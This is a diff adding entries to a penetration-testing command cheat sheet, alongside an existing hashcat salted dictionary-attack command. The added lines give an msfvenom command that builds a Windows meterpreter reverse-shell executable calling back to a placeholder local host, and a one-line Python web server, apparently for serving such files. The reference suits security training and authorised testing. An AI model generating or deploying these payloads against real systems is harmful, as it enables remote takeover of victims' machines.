@@ -25,6 +25,19 @@ hashcat -O -a 0 -m <HASH Type> <FILE HASH>:<SALT>
 ```
 -- This command runs Hashcat in optimized mode (`-O`) to crack a hash (`<FILE HASH>`) that uses a salt (`<SALT>`), using a dictionary attack (`-a 0`) against a specific hash type 
 
+### Create Reverse Shell Malware
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL HOST> LPORT=4444 -f exe > shell.exe
+```
+-- This command will utilise the MSF venom package of the Metasploit framework and generate a revers shell listening on port 4444
+
+### Host a Python Webserver
+```bash
+python3 -m http.server 8000
+``` 
+-- This command will host a minimised webserver on port 8000 locatable at the local IP of the endpoint 
+
+
 ## 📝File Information
 
 ### Retrieve basic file information
